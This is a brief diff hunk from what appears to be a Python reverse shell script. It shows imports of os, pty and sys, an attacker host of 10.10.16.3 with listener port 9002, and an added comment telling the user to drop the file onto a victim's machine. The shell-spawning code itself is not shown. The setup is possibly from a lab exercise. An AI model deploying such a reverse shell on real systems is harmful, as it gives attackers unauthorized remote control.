@@ -4,6 +4,8 @@ import os
 import pty
 import sys
 
+# drop this file into victim's machine
+
 lhost="10.10.16.3" # Your machine's IP address
 lport=9002 # Port to listen on your machine
 
